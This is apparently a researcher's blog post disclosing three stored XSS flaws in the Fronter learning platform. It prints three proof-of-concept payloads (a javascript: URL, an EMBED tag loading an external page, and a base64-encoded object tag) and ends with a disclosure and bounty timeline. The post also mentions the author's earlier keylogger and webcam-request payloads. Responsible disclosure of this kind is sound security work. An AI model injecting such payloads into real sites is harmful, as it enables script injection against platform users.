---
title: "Fronter XSS - 3 XSS in 1 Blogpost"
date: "2018-04-06"
categories: 
  - "articles"
tags: 
  - "fronter"
  - "fronter-vulnerabilities"
  - "fronter-vulnerability"
  - "stored-xss"
coverImage: "fronter-xss-vulnerabilities.jpeg"
---

Today I want to write about Fronter and Fronter XSS Vulnerabilies. Fronter is a learning platform from leading ICT provider, itslearning. Based on Nordic educational models, Fronter is a comprehensive teaching and learning solution used in schools and universities worldwide. As part of the itslearning portfolio, the Fronter solution has a full range of available support and professional services.

I found lots of XSS vulnerabilities on Itslearning as you know, Fronter was the goal after Itslearning.

## Here is the story of 3 Fronter XSS Vulnerabilities 

[![fronter XSS](images/payload-3.jpg)](https://mustafakemalcan.com/wp-content/uploads/2018/04/payload-3.jpg)

Our first payload is very typcial one; javascript:alert(1)

Second payload is powered by EMBED; <EMBED SRC="[https://mustafakemalcan.com/](https://t.co/pO3Wu3kLxh "https://mustafakemalcan.com/webcam.html") " width= 100% height= 100%></EMBED>

Last payload is more complicated than the other ones ; <object data="data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=">

I can add keylogger and make webcam request like before that [stored XSS Itslearning vulnerability](https://mustafakemalcan.com/itslearning-xss-part-2/).

UPDATE :

02/04/2018 - I contacted to Fronter Team.

12/04/2018 - Fronter closed vulnerabilities.

07/05/2018 - Fronter decided to give 1200$ bounty to me.
